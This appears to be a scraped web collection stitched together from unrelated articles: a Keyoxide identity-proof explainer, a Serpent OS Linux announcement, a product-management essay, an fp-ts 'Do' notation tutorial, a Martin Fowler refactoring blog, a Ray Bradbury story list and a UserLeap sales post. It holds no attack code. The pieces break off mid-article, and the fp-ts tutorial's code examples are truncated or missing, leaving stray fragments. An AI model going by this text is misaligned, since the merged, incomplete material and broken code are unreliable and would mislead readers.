<h2>What are those decentralized identity proofs you keep mentioning?</h2>
<p>You know how Keybase allows you to prove you have control over accounts on certain websites and services? A great function! Fortunately for you, this function can be even better and more secure by using <a href="https://keyoxide.org/guides/openpgp-proofs">decentralized OpenPGP identity proofs</a>. <a href="https://keyoxide.org/">Keyoxide.org</a> will prove your identity on multiple platforms at the same time and yet, you are not required to make an account to use this function. How is that possible?</p>
<p>Well, it's called <em>decentralized</em> for a reason: <a href="https://keyoxide.org/">Keyoxide.org</a> doesn't hold your proofs, your key does! Any software that can access your public key can verify these proofs for anyone. When better tooling comes around, you could verify those proofs using a mobile app, using a command-line utility, you name it. No single service holds your proof, only you do, stored inside your keypair.</p>
<p>I have written a <a href="https://keyoxide.org/guides">guide</a> on how to add a proof for every platform currently supported by this website: <a href="https://keyoxide.org/guides/dns">domains</a>, <a href="https://keyoxide.org/guides/lobsters">Lobste.rs</a>, <a href="https://keyoxide.org/guides/twitter">Twitter</a>, <a href="https://keyoxide.org/guides/github">Github</a>, a <a href="https://keyoxide.org/guides">bunch more</a> and work is in progress to support even more still. Is your beloved service not in the list? <a href="https://codeberg.org/yarmo/keyoxide">Open an issue or make a PR</a>! Free open-source software FTW!</p>
<p>Oh, that reminds me, any <a href="https://keyoxide.org/guides/mastodon">Mastodon</a> instance can be used to prove your identity. Yes, <a href="https://github.com/keybase/keybase-issues/issues/3385">any</a>.</p>
<h2>So how does it compare to Keybase?</h2>
<p>There's a more complete <a href="https://keyoxide.org/guides/feature-comparison-keybase">guide on the Keyoxide website</a>, but in a nutshell:</p>
<ul>
<li>more privacy-friendly by not forcing you to create an account and handing over data</li>
<li>more secure by not asking you to trust the service with your private keys</li>
<li>open-source servers (<a href="https://github.com/keybase/client/issues/24105">a must</a>)</li>
<li>encrypt/verify with every public key accessible on the internet, not just those that have been uploaded to a proprietary server</li>
<li>almost all processing is done in the browser, no data is sent to servers*</li>
<li>no vendor lock-in</li>
<li>selfhostable</li>
</ul>
<p>* Only exception is decentralized identity proof verification: some service providers do not have the correct CORS headers (like Reddit) or require APIs (like Twitter). In these rare cases, simple PHP scripts (also open-source) run the proof verification instead.</p>
<h2>Can I get an account?</h2>
<p>No. <a href="https://keyoxide.org/">Keyoxide.org</a> doesn't need your data on its servers. There are already several ways of exposing public keys on the internet, including <a href="https://keyoxide.org/guides/web-key-directory">web key directory</a> (WKD) and dedicated servers like <a href="https://keys.openpgp.org/">keys.openpgp.org</a>. Let's use those instead of making yet another service where you need to upload your keys to.</p>
<h2>Can I get a profile page then?</h2>
<p>Yes! Append your PGP fingerprint or WKD id to the URL and there it is!</p>
<p>Want an example? Here's  my profile at<br>
<a href="https://keyoxide.org/9f0048ac0b23301e1f77e994909f6bd6f80f485d">https://keyoxide.org/9f0048ac0b23301e1f77e994909f6bd6f80f485d</a>.</p>
<p>Now you know what accounts on various services are mine, where to follow me if you wish to get updates on the project and if you wish to send me an encrypted message, that's also just two clicks away.</p>
<h2>What about my private keys?</h2>
<p>Don't upload your private keys to the internet, period. If a service wants your private keys on their (proprietary) servers, say no.</p>
<h2>You said selfhostable?</h2>
<p>Well, yes! It's not a fully supported use case just yet, but the browser does all the processing, the server is mostly just there to deliver the files to the user to perform the operations. <a href="https://codeberg.org/yarmo/keyoxide">Grab the code</a> and put it on your own PHP server!</p>
<h2>Any closing words?</h2>
<p>I built this to provide better tooling around modern-day encryption programs and reduce the friction for less tech-savvy people when interacting with public keys.</p>
<p>For those who wish to use encryption programs beyond OpenPGP, <a href="https://codeberg.org/yarmo/keyoxide/issues">let's talk about this</a>. Keyoxide doesn't have any reference to PGP in its name for a reason: it could serve as a platform for easy interaction with any public key, no matter the underlying encryption program.</p>
<p>And above all, I hope you see the same benefit and potential in <a href="https://keyoxide.org/">Keyoxide.org</a> as I do and would like to see it grow as an open and accessible platform to push forward the democratization of online privacy and security.</p>
<p>Privacy is not a luxury.</p>
<p>Many thanks to <a href="https://metacode.biz/@wiktor">Wiktor</a> for helping with the decentralized identity proofs.</p></div></div>]]>

    <div>
        <article>
            <p>Serpent OS is (or at least, will be) a Linux distribution with notably different goals
from the mainstream offering. We’re in the process of establishing the project, with
development properly starting towards the end of July.</p>
<h4 id="naming">Naming</h4>
<p>Eventually our plan is to rebrand as ‘Serpent Linux*’ - however we will first need to
complete some early donkey work and apply for a sublicense to use the name. As explained
below, this is <em>not</em> Serpent ‘GNU/Linux’ as the distribution will not be dependent on
a GNU toolchain or runtime. For those who are curious, we’re working with an artist to
choose an appropriate logo for the project.</p>
<h4 id="aims">Aims</h4>
<p>The vast majority of Linux distributions have highly similar goals, and can be best
described using these common industry buzzwords:</p>
<pre><code>Modern, lightweight, privacy oriented/respecting, user-friendly desktop
</code></pre>
<p>We’re focused on building a Linux distribution that serves our own needs.
Chiefly, a Linux distribution for people who want to use Linux, not a “Linux-based-OS”
focusing on interoptability with macOS* + Windows*.</p>
<p>In a nut shell, this is <strong>not</strong> “Linux for the masses”. This is a project setting out to
use Linux as Linux should be used. This will in turn help us to build a significantly
advanced Linux distribution that is both modular and optimised for modern machines.</p>
<h4 id="a-truly-modern-linux-distribution">A Truly Modern Linux Distribution</h4>
<p>As we’re taking a distro-first, compatibility-later approach, our design decisions
will allow us to take some bold steps. We’ll also be able to incorporate all of the
more sensible design improvements in Linux distribution design over the last decade or
so:</p>
<ul>
<li>No more usrbin split</li>
<li>100% clang-built throughout (including kernel)</li>
<li>musl as libc, relying on compiler optimisations instead of inline asm</li>
<li><code>libc++</code> instead of <code>libstdc++</code></li>
<li>LLVM’s binutils variants (<code>lld</code>, <code>as</code>, etc.)</li>
<li>Mixed source/binary distribution</li>
<li>Moving away from <code>x86_64-generic</code> baseline to newer CPUs, including Intel and AMD specific optimisations</li>
<li>Capability based subscriptions in package manager (Hardware/ user choice / etc)</li>
<li><code>UEFI</code> only. No more legacy boot.</li>
<li>Completely open source, down to the bootstrap / rebuild scripts</li>
<li>Seriously optimised for serious workloads.</li>
<li>Third party applications reliant on containers only. No compat-hacks</li>
<li>Wayland-only. X11 compatibility via containers will be investigated</li>
<li>Fully stateless with management tools and upstreaming of patches</li>
<li>Lots, lots more. We’ll blog about it.</li>
</ul>
<h4 id="opinionated-by-default">Opinionated By Default</h4>
<p>A recurring theme that holds back the development of world-class Linux, is high tolerance
for those holding Linux back. A perfect example is NVIDIA* and their lack of support for
accelerated Wayland support on their GPUs. Consequently, our project won’t tolerate such
decisions and will instead blacklist the NVIDIA proprietary drivers from the distribution.</p>
<p>There are other examples that will emerge over time, and will become quite clear.</p>
<p>The time for Linux distributions giving in, with thousands of man hours wasted working around
negative actors, had come to an end.</p>

<p>We will only accept community involvement via our IRC channel: <code>#serpentOS</code> on Freenode.
We will not operate a public bug tracker or forums. Once we are past out initial bootstrap
phase we will set up an email address to help reporting security issues to the team, and
we will of course release security notices.</p>
<p>In terms of feature requests, these will be largely at the discretion of core contributors.
When a company has been formed to house this project, we’re happy to hash out an SLA for
required works.</p>
<h4 id="timescale">Timescale</h4>
<p>It may seem incredibly odd launching a website before there is a distro to show off, however,
it became very apparent that the cat would be out of the bag, so we wanted to be prepared.</p>
<p>Currently, the Founder is in the midst of relocating to the Republic of Ireland. Once complete
we’ll move to stage2 of our bootstrap process and begin working on the tooling needed for the
base development.</p>

                <div>
                    <p>The short answer is yes. Let me explain.</p><p>I’ve been working with developers and designers my entire life. </p><p>I’ve built a couple of products, worked at a young startup, and I’m now at Zepel helping development teams build better software.</p><p>I’ve spoken to 1000+ development teams while at Zepel alone. <strong>And it's evident that the way we build products is broken.</strong></p><p>There’s so much disconnect between how you and I talk about building products and how our teams actually build them.</p><p>For all the talk of scrum and agile and getting feedback quickly, there’s so much that’s broken in how we act on the feedback and build the feature.</p><p>Teams spend so much time and effort getting a deeper understanding of customers’ needs. And yet distil everything down to a simple two-line ticket and a couple of lines of markdown description.</p><p>This is hurting your developers. And it’s hurting your business.</p><blockquote>Nothing is more frustrating than having to understand what an entire feature should or shouldn’t do from a two-line ticket filled with ten bullet points of acceptance criteria.</blockquote><p><em>*Here are five prioritized tickets for the upcoming sprint. We have to ship them on time!*</em></p><p>On the other hand, you have teams who are able to build top quality software. They’re the ones who can concentrate on the fine implementation details without losing focus on the broader purpose of the feature as a whole.</p><p>Everyone wants to get to that level. But instead, teams do the exact opposite.</p><p><strong>Teams think in issues and tickets, instead of the feature as a system.</strong></p><hr><h2 id="development-teams-are-not-ticket-movers-">Development teams are not ticket movers!</h2><p>Today, everything is about moving a ticket from “Todo” to “Done” as quick as possible. And watching burndown charts. And customizing the tool to the extent that the developer only views a single ticket.</p><p><em>*“What’s the velocity of our team?” is simply another way of asking how quickly can my team move an issue from “Todo” to “Done”.*</em></p><p>Pieces of that stuff are important for productivity and shipping on time.</p><p>But seriously, how is your team supposed to ship anything of value if you narrow their focus down to the smallest unit of work without any context of why it’s needed or how it connects to the whole feature?!</p><p>Overall, we’ve lost our way. Product development today has become more about checking items off a list as quickly as possible. </p><p><strong>It isn’t enough to write multiple user stories and share a Figma link if you want to ship quality software.</strong></p><hr><h2 id="how-software-product-teams-really-build-software-together">How software product teams really build software together</h2><p>Development teams build better software together when they have the complete context of what and why something is being built.</p><p>To achieve this, the foundational elements need to change.</p><p>And it starts with getting the right abstractions and naming conventions.</p><p><strong>The names you choose determine the perception and the quality of conversations you have. </strong>It’s why top developers spend time obsessing over names for classes, functions, and variables.</p><p>When you open up a VS Code and see a function called <code>send_signup_email</code>, you have a certain sense of what’s going to be inside and why that’s there.</p><p>The right abstractions can drive the team towards asking the right questions. And this is critical.</p><p><strong>Because when you’re tracking issues and tickets in isolation you have no choice but to measure only outputs.</strong></p><p>And teams today don’t want to measure only the outputs. They want to measure <em>outcomes</em>.</p><hr><h2 id="what-s-the-right-abstraction">What’s the right abstraction?</h2><p>The right abstraction is the one that prioritizes people over processes and tools. It's the one you and I use every day — it's Features.</p><p>When a squad creates a Feature and opens it, they’ll get to look at the entire feature as a unit. A user story inside it might describe a specific functionality. But the difference is, now each developer and designer know how it connects to the larger scheme of things for the entire feature.</p><blockquote>A feature forces inept managers to stop focussing on output-oriented questions like “how can we work faster”. <p>And shifts the focus on outcome-oriented questions like “why should we prioritize this feature” and “how does this feature tie to the OKR”.</p></blockquote><p>Miscellaneous tasks and incoming bugs can be tracked on a separate “List”, so high-priority bugs don't get missed out. And of course, when it comes to tracking them, they can all be tracked on a Sprint or on a Kanban Board.</p><p><strong>Feature as an abstraction is the right middle ground that lets you focus on the output as well as the outcome.</strong> It lets you zoom in and track what's happening today. It also allows you to zoom out and track a feature's progress across multiple disciplines. And it enables you to see how a feature moves from a feature request all the way to prioritization and development.</p><p>Simple issue trackers and project management tools have shoehorned teams into ticket-movers and have made them think in outputs. Metrics get feigned to show productivity. Thinking in outcomes has become ridiculously hard. And it's hurting businesses.</p><p>It's time for tools to reflect the reality of product development. It's time to remove the disconnect between development teams and what your customers really want. </p><p>It's time to stop thinking in isolated tickets and start thinking in features as a system!</p><hr><p>If you liked what you read, I think you’ll love what we have in store for you.

If you've used fp-ts for any length of time, you've probably noticed that this problem isn't specific to asynchronous code. For example, this expression which sums three optional numbers:</p><div data-language="ts">
      <pre><code>option<span>.</span><span>chain</span><span>(</span>maybeA<span>,</span> <span>a</span> <span>=&gt;</span>
  option<span>.</span><span>chain</span><span>(</span>maybeB<span>,</span> <span>b</span> <span>=&gt;</span>
    option<span>.</span><span>map</span><span>(</span>maybeC<span>,</span> <span>c</span> <span>=&gt;</span>
      a <span>+</span> b <span>+</span> c
    <span>)</span>
  <span>)</span>
<span>)</span></code></pre>
      </div><p>This, of course looks similar to how we'd deal with fetching numbers from some external service:</p><div data-language="ts">
      <pre><code>fetchA<span>.</span><span>then</span><span>(</span><span>a</span> <span>=&gt;</span>
  fetchB<span>.</span><span>then</span><span>(</span><span>b</span> <span>=&gt;</span> 
    fetchC<span>.</span><span>then</span><span>(</span><span>c</span> <span>=&gt;</span> a <span>+</span> b <span>+</span> c<span>)</span>
  <span>)</span>
<span>)</span></code></pre>
      </div><p>Also, suppose these numbers were stored in either values, and we wanted to compute the sum, or return early with an error:</p><div data-language="ts">
      <pre><code>either<span>.</span><span>chain</span><span>(</span>errorOrA<span>,</span> <span>a</span> <span>=&gt;</span>
  either<span>.</span><span>chain</span><span>(</span>errorOrB<span>,</span> <span>b</span> <span>=&gt;</span>
    either<span>.</span><span>map</span><span>(</span>errorOrC<span>,</span> <span>c</span> <span>=&gt;</span>
      a <span>+</span> b <span>+</span> c
    <span>)</span>
  <span>)</span>
<span>)</span></code></pre>
      </div><p>Note: You may have noticed that we could have used something like <code>Promise.all</code> to combine all of our fetched numbers. In this case, it's true (disregarding the fact that <code>all</code> executes in parallel), however, as soon as we need to use the output of the previously chained value as input to the next, we're back to nesting <code>chain</code>s.</p><p>JavaScript has added async await syntax, which helps avoid this problem for promises:</p><div data-language="ts">
      <pre><code><span>const</span> a <span>=</span> <span>await</span> fetchA<span>;</span>
<span>const</span> b <span>=</span> <span>await</span> fetchB<span>;</span>
<span>const</span> c <span>=</span> <span>await</span> fetchC<span>;</span>

<span>return</span> a <span>+</span> b <span>+</span> c<span>;</span></code></pre>
      </div><p>This is nice, but it only works for promises; it won't work for option chains, either chains, or any other chainable. It would be nice if we had something like this that would work for <em>all</em> chainable (monad) values.</p><p>This pattern happens quite often in functional programming, and certain fp languages even have special syntax sugar for expressing chains like these in a succinct manner, such as Haskell's <a href="https://en.wikibooks.org/wiki/Haskell/do_notation">do notation</a>, or Scala's <a href="https://docs.scala-lang.org/tour/for-comprehensions.html">for comprehension</a>. There have been a few attempts to mimic this syntax in JS. One popular way is to use generators. Generators don't work for all monads, and they have poor typescript support. It would be nice to have something that works with typescript, and supports all monads.</p><p><code>Do</code> is an attempt at this. It uses the builder pattern to collect the successful value from each chainable, and stores them in an object. At each successive step, the result of any chainable from previous values in the chain is accessible, making it possible to prevent nested callback situations, which can help make code clearer.</p><h3 id="do-for-option"><a href="#do-for-option">Do for Option:</a></h3><p>Let's get a feel for how <code>Do</code> works by using it with the previous examples:</p><p>Here we have 3 <code>Option</code> values each chained successively:</p><div data-language="ts">
      <pre><code><span>import</span> <span>{</span> option<span>,</span> Option <span>}</span> <span>from</span> <span>'fp-ts/lib/Option'</span>

    option<span>.</span><span>map</span><span>(</span>maybeC<span>,</span> <span>c</span> <span>=&gt;</span>
      a <span>+</span> b <span>+</span> c
    <span>)</span>
  <span>)</span>
<span>)</span></code></pre>
      </div><p>The <code>Do</code> equivalent of this snippet is:</p><div data-language="ts">
      <pre><code><span>import</span> <span>{</span> Do <span>}</span> <span>from</span> <span>'fp-ts-contrib/lib/Do'</span>

      </div><p>At each <code>bind</code> step, we're passing an identifier, and an <code>Option&lt;number&gt;</code> value. Each step will only continue on if the previous value was present. Finally, the last return statement, the provided values at <code>a</code>, <code>b</code>, and <code>c</code>, are each <code>number</code>s. The function here can be used to transform the result value. Remember, each step only gets invoked if all of the previous options were defined. For example, let's say that <code>maybeA</code>'s  value was <code>some(5)</code>, <code>maybeB</code>'s value was <code>none</code>, and <code>maybeC</code>'s value was <code>some(6)</code>. The <code>Do</code> chain would stop at the second step, and the result of the entire <code>Do</code> expression would be <code>none</code>.</p><div data-language="ts">

result </code></pre>
      </div><p>If all of the values were defined, then we'd reach the <code>return</code>, and the result of the expression would be <code>some(sum)</code>, where <code>sum</code> is the value returned by the <code>return</code> function:</p><div data-language="ts">

      </div><h3 id="do-for-either"><a href="#do-for-either">Do for Either</a></h3><p>When using <code>Do</code> with <code>Either</code> values it behaves similarly to <code>Option</code>.

      </div><p>The <code>Do</code> function takes an instance of a Monad typeclass, which handles the chaining of the values that you pass as the second parameter to <code>bind</code>. The type of the typeclass instance also determines the <em>type</em> of values you will be able to chain. For instance, <code>Do(option)</code> will enable you to chain <code>Option</code> values (since <code>option</code>'s type is <code>Monad1&lt;"Option"&gt;</code>'). <code>Do(either)</code> will enable you to chain <code>Either</code> values (since <code>either</code>'s type is <code>Monad2&lt;"Either"&gt;</code>). The value returned from <code>Do</code> is a builder that will let you create chains of these monads.</p><h2 id="bind"><a href="#bind">.bind</a></h2><p><code>.bind</code> takes a <code>string</code> identifier, and an instance of the contextual monad. It will extract the "inner" value from the monad and assign it to a context object, which will make it available in subsequent methods:</p><div data-language="ts">
      <pre><code><span>Do</span><span>(</span>option<span>)</span>

      </div><p>The builder will maintain every key, adding each value to it's context object.
Note that in the <code>return</code> function, <code>context.user</code>'s and <code>context.manager</code>'s types are <code>User</code>, not <code>Option&lt;User&gt;</code>. <code>bind</code> "extracts" the values for us, in the same way that <code>async</code> "extracts" the value out of a promise.</p><div data-language="ts">

      </div><p>Since we've used <code>sequenceS</code> here, If both <code>startTime</code> and <code>endTime</code> are invalid, <code>result</code> will be a <code>Left</code> containing <em>both</em> of the errors.

Consider if we used <code>bind</code> instead:</p><div data-language="ts">

      </div><p>In this example, if <code>startTime</code> and <code>endTime</code> are invalid, then <code>result</code> will only contain the error from checking <code>startTime</code>, since <code>chain</code> short-circuits.</p><h2 id="let"><a href="#let">.let</a></h2><p><code>let</code> is the simplest of these, and just allows us to introduce identifiers without breaking the expression:</p><div data-language="ts">

These variants work exactly like their counterparts, except that the second parameter is a function (lamda, hence the <code>L</code> suffix) which returns the monad value. The parameter to the function is the context object that <code>Do</code> maintains. This makes it easy to extract &amp; chain monads whose values depend on extracted values from previous steps in the chain.</p><p>Here's an adaption of the date validation example from above. Let's suppose that we also want to validate that the <code>startTime</code> is <em>before</em> <code>endTime</code>. For that, we'll need the actual <code>Date</code> values that are extracted from the ISO values. This can only happen if we've succesfully validated the <code>startTime</code> and <code>endTime</code> ISO strings, though:</p><div data-language="ts">

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><header><p>June 30, 2020<!-- --> <!-- -->•<!-- --> <span>programming</span></p></header><section><p>I picked up <a href="https://martinfowler.com/books/refactoring.html">Refactoring, by Martin Fowler</a>, and I am learning a lot. The book is written like a catalogue that you can refer back to later. And, for those who are seeking, <strong>the book is an excellent chance to get your code reviewed by Martin Fowler!!</strong> 😮</p>
<p>Martin starts the book with an example that he goes on to refactor in the first chapter. Sensing an insane opportunity, I stopped right away and copied this original code in Ruby. I then went ahead, wrote down my thoughts and refactored the code like I would if it was an actual thing I was working on. Once I was done, I went back to the book and compared Martin’s notes against mine, and learnt from his thought process and code. I think this is the best way to read this chapter.</p>
<p>If you are someone who enjoys this, I highly recommend you give this a try too. And if not the book, use this blog to power your review.</p>

<p><strong><em>(Psssst… You can find the full original code here: <a href="https://github.com/ketanbhatt/refactoring-rb/tree/master/chapter-1/a_first_example/original">Github</a>)</em></strong></p>
<p>We have a Theatre Company that perform plays in events. They charge customers based on the type of the play, and also provide a “Volume Credit” for future discounts. The Company stores data about their plays (<a href="https://github.com/ketanbhatt/refactoring-rb/blob/master/chapter-1/a_first_example/original/plays.json">plays.json</a>) and bills (<a href="https://github.com/ketanbhatt/refactoring-rb/blob/master/chapter-1/a_first_example/original/invoices.json">invoices.json</a>) in JSON files.</p>
<p>The simple code below is used to print a bill from an invoice. This is the code we will attempt to refactor. Assume that this code is part of a much larger system and we are refactoring while adding a feature to print bills in HTML. Moreover, the Company has plans to perform more types of plays in the future.</p>

<p><strong><em>(Psssst… You can find the refactored code here: <a href="https://github.com/ketanbhatt/refactoring-rb/tree/master/chapter-1/a_first_example/ketanbhatt">Github</a>)</em></strong></p>
<p>Reading through the code, this is what stood out for me:</p>
<ol>
<li>The <code>statement</code> method returns a formatted text right now. I would like it to return a structured statement that I can format later as I wish, for example: for sending Slack notifications, emails. Additionally, it simplifies writing tests for this and the formatter methods.</li>
<li>The code that adds extra <code>volume_credits</code> for <code>comedy</code> plays, the comment states that we add extra credit for every “10” attendees, but the code adds a credit for every “5” attendees. Either this comment has gone stale, or there is a bug in the code. Either way, we can make the code more readable and remove the comment. (Aside: I like <a href="http://antirez.com/news/124">antirez’s blog about writing comments</a> a lot.)</li>
<li>Overall, it is difficult to understand what is going on in the code. I think we can make it more readable easily.</li>
<li>The method is doing too much, calculating <code>volume_credit</code> and <code>amount</code> for each type of play, and creating the text. It would be better if I can hand over this calculation to a different class that would do the needful, and my method just creates the text.</li>
<li>Because of this “doing too much”, the code has become messy. It will become still messier if the calculation was different for each Play too (and not same for Plays of the same type).</li>
<li>Also, looks like that the calculation is in cents and is being converted to dollars in the text. The code should make this explicit. Maybe I could rename the variable to be <code>amount_in_cents</code>?</li>
<li>The code right now assumes <code>audience</code> to be present and to be a number. Maybe we should put in validations that <code>asserts</code> for this truth? Although it seems out of scope for our current exercise.</li>
</ol>

<p>I moved the code for calculating amount and volume credits to a different class and file. I also separated the calculation for the two types of plays.</p>
<p>In the future, adding new play types will just need a new class to be added.</p>
<div data-language="ruby"><pre><code>

<br>
I also implemented the calculation in a more verbose manner. I think this improves the readability of the code.

I will call the refactoring done at this point.
<div><p>Although, I can’t seem to shake off this feeling that there is something more that can be done. I don’t think I am completely happy with the changes 😕 Let’s see what Sir Martin has to say.
</p></div>
<center>
<p><img src="https://media.giphy.com/media/vA4EnqvJxDv2g/giphy.gif" alt="Excited Anticipation GIF"></p>
</center>

<p>The process that Martin followed for refactoring the original code, in his words, was:</p>
<blockquote>
<ol>
<li>Decomposing the original function into a set of nested functions</li>
<li>Separate calculating and printing code, the two phases.</li>
<li>Introducing a polymorphic calculator for the calculation logic.</li>
</ol>
</blockquote>

<p>From what I have learnt in this chapter, in the <strong>hypothetical scenario</strong> in which Martin Fowler does a code review of my changes, this is what he would have to say:</p>
<ol>
<li><em>“I like that you are using an intermediate structure to pass the calculation …</em></li></ol></section></article></div>

</div></div><div data-block-type="2" id="block-32e240a0acc2fe970f20"><div><p>When the first edition of <em>Listen to the Echoes: The Ray Bradbury Interviews </em>was published in June of 2010, I embarked upon an overly-ambitious project. I began a series on my blog titled “The Essential Bradbury,” where I intended on listing the 25 must-read Ray Bradbury short stories for any would-be Martian-neophytes. I listed out each story, its history, themes, and what made the tale top-shelf Bradbury. Over the next few years, I made it all the way to 18 stories! But, then, the old web site came down as <a href="https://hatandbeard.com/products/listen-to-the-echoes-the-ray-bradbury-interviews"><em>Listen to the Echoes</em></a> was published in a handsome new edition by a new publisher and, alas, I never completed the 25 “Essential Bradbury” stories.</p><p>So here I go again! Fans have been writing me, asking if I would re-post the old story suggestions and, at long last, finish the project. And so it begins. I figure I only have seven more stories to write about! I have reordered many of my choices. I will be counting down from 25 to number 1 over the next few weeks. </p><p>People often ask, "where should I begin when it comes to reading Bradbury?"</p><p>The long answer? In 2010, Everyman's Library republished <a href="https://www.amazon.com/Stories-Bradbury-Everymans-Contemporary-Classics/dp/0307269051/ref=sr_1_1?ie=UTF8&amp;qid=1543608624&amp;sr=8-1&amp;keywords=the+stories+of+ray+bradbury"><em>The Stories of Ray Bradbury</em></a><em> </em>containing a staggering 100 of Bradbury's best short stories. Along with this, there is the equally voluminous <a href="https://www.amazon.com/Bradbury-Stories-Most-Celebrated-Tales/dp/0060544880/ref=sr_1_1?ie=UTF8&amp;qid=1543608705&amp;sr=8-1&amp;keywords=bradbury+stories"><em>Bradbury Stories</em></a>, published in 2003, containing&nbsp;yet another 100 more short fictional gems. (Bradbury dedicated this last book, in part to me, an incredible, stirring gift.) Certainly, you cannot go wrong by reading either of these spectacular volumes. Bradbury is a master of the short story.&nbsp; It is, in my estimation, his strongest creative form. His wife of 56 years, Marguerite, agreed with me. Yet reading 200 stories is, for many, an unrealistic goal.</p><div><p>So the short answer of where to begin with Bradbury is this list, right here. I will offer up a streamlined list of 25 of my own personal favorite short fictions by the master of miracles. These stories will embody all the trademarks of vintage Bradbury: the lyrical language; the fantastic, original, and memorable ideas; the rich metaphor; and endings that sometimes surprise, sometimes sadden, always instruct and entertain. This list will be entirely subjective. These are my favorites. They will reflect a wide range, from weird tales to social science fiction to quiet and contemplative tales of contemporary literature. These tales are pure and classic Bradbury—our modern mythologist.</p><p><strong>#25 “THE FIRST NIGHT OF LENT”</strong></p></div><p><span>Where to Find It</span>: <em>A Medicine for Melancholy,</em> <em>The Stories of Ray Bradbury</em></p><p><span>First Published</span>: <em>Playboy, March, 1956</em></p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1550443716450_14171"><div>

</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1550443716450_17081"><div><p><span>Plot Synopsis</span>: A young screenwriter at work in Ireland in 1953 discovers that his ever-reliable regular taxicab driver has become dangerous and impaired when behind the wheel. Nick, the village driver, escorts the young writer from Dublin to the Irish countryside and the estate of the young screenwriter’s director. Nick then waits at the local pub until the writer is ready to be driven back to the city. There is never a problem, until the first night of Lent. . . .</p><p><span>Critique</span>: Any “essential” list of Bradbury short stories must include an Irish tale (as well as a Mexico story, a Mars story, and a Green Town story, for that matter). The problem is, of course, <em>which</em> Irish story? I choose this one for two simple reasons. First, Bradbury takes the lyrical quality of his voice and drenches it in a poetic and authentic Irish brogue.</p><p><em>Nick, now</em>. <em>See his easy hands loving the wheel in a slow clocklike turning as soft and silent as winter constellations snow down the sky. Listen to his mist-breathing voice all night-quiet as he charms the road, his foot a tenderly benevolent pat on the whispering accelerator, never a mile under thirty, never two miles over. Nick, Nick and his steady boat gentling a mild sweet lake where all Time slumbers. Look, compare. And bind such a man to you with summer grasses, gift him with silver, shake his hand warmly at each journey’s end</em></p><p><em>“Good night, Nick,” I said at the hotel. “See you tomorrow.”</em></p><p><em>“God willing,” whispered Nick</em></p><p><em>And he drove softly away.</em></p><p>The second reason I have selected this story for “The Essential Bradbury” list is that this is the first Irish story Bradbury wrote. It is his first creation, fresh-removed and newly-minted from his own actual experiences of living in Dublin in the autumn of 1953 and the winter of 1954, writing the screenplay for <em>Moby Dick</em> for film director John Huston. From a biographical standpoint, it is fascinating to read a work of short fiction that is, ostensibly, memoir. And with “The First Night of Lent,” Bradbury had discovered a trove of material that would continue to yield rich story, culminating in the publication of the 1992 semi-autobiographical novel, <em>Green Shadow, White Whale</em>, a minor-class</p><p><span>The Beginning of the Irish Stories</span>: As Ray recalled, one night after he had returned from Ireland, he was in bed and a voice spoke to him</p><p>“Ray, darling!”</p><p>Ray responded, “Who is it?” </p><p>And the voice said, “It’s Nick, the cab driver who drove you back and forth from Dublin to Kilcock 80 or 90 times. Do you remember that, Ray? Do you?” </p><p>And Ray said, “Yes?”</p><p>And the voice said, “Would you mind puttin’ it down?” </p><p>So Ray Bradbury started writing his Irish stories, beginning with “The First Night of Lent.”</p><p><span>Historical Aside</span>: A fascinating <em>New York Times </em>article on John Huston’s Georgian Irish Manor, ran June 12, 2012. Check it out <a href="http://www.nytimes.com/2012/06/15/greathomesanddestinations/15iht-reireland15.html">here</a>.</p><p>This is the very house where, in 1953, Nick the cab driver picked Bradbury up late at night, to drive him back to Dublin. This is the very house where Ray say with John Huston, late into the Irish night, as Huston went over Ray’s adaptation of <em>Moby Dick</em>.</p><p><strong>#24 “THE SOUND OF SUMMER RUNNING”</strong></p><p><span>Where to Find It</span>:<em> Dandelion Wine</em>, <em>The Stories of Ray Bradbury</em></p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1550446114005_16095"><div>

His shoes are worn out, his feet feel heavy, and he is convinced that this resplendent pair of Cream-Sponge Para Litefoot Shoes will change his summer forever.</p><p><span>Backstory</span>: Ray Bradbury on the origins of the story from <em>Listen to the Echoes: The Ray Bradbury Interviews</em>: </p><p>“I was on a bus going into Westwood a few years ago, and a young boy jumped on the bus, threw his money in the box, raced down the aisle, and threw himself into a seat across from me.&nbsp; And I looked at him, and I said, ‘My god, if I had his energy, I could write a poem every day, a story every week, a novel every month.&nbsp; What’s his secret?’&nbsp; I looked down at his feet.&nbsp; He had the brightest pair of new fresh tennis shoes on his feet.&nbsp; And I said, oh, my god, I can remember when I was a kid, my father taking me downtown and buying me my first pair of new summer tennis shoes.&nbsp; I went home, and I wrote the short story.”</p><p><span>Critique</span>: This story is a shining example of Bradbury’s range as a literary writer. The man did not need an otherworldly landscape or elements of the fantastic to meditate on the human experience. Bradbury found magic in the every day, in this case, in a new pair of tennis shoes and the perspective of youth. The best Bradbury, in my opinion, is rooted in unforgettable story with a philosophical question at its center, all told in his singular, poetic style.</p><p><span>The Prose</span>: <em>Somehow the people who made tennis shoes knew what boys needed and wanted. They put marshmallows and coiled springs in the soles and they wove the rest out of grasses bleached and fired in the wilderness. Somewhere deep in the soft loam of the shoes the thin hard sinews of the buck deer were hidden. The people that made the shoes must have watched a lot of winds blow the trees and a lot of rivers going down to the lakes. Whatever it was, it was in the shoes, and it was summer.</em></p><p><br> <strong>#23 “THE LONG RAIN”</strong></p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1553888873530_11881"><div>

      <p>A fascinating pattern has started to emerge while growing UserLeap. </p><p>When I meet with a winning company and show them our product? Their eyes light up and they immediately get it.</p><p>The company is almost always a category leader, or quickly on its way. Often, their app is on my phone home screen. The press constantly writes about them. Customers rave about their product. Awards are the norm. Everyone knows who they are. I’m giddy just speaking with them. </p><p>But there’s no selling necessary. Budget is rarely an issue. I meet with them for 30 minutes and they move right into a trial. </p><p>The struggling companies? Their startup isn’t taking off. Growth has plateaued. The stock price is declining. Competitors are stealing customers.</p><p>When I meet with these companies it’s always a challenging conversation. They say there are other priorities. I realize it’ll be a long sales cycle. They rarely move forward. </p><p>Those winners? They’re winning because they understand their customer — and better than anyone else. Customer motivations. Inner fears. Challenges. Habits.</p><p>Their top priority is their customer. It was from day one. It's why they became successful. It’s why they’re winning today. It’s how they know they’ll continue to win—every day. UserLeap is the ideal solution that puts their customer first and drives customer-informed decision making across their company.</p><p>The struggling companies? Their customers are a priority tomorrow. Or next quarter. Or next year. Right now, something else is more important. Internal politics. A logo redesign. A press write up. An internal promotion. The next 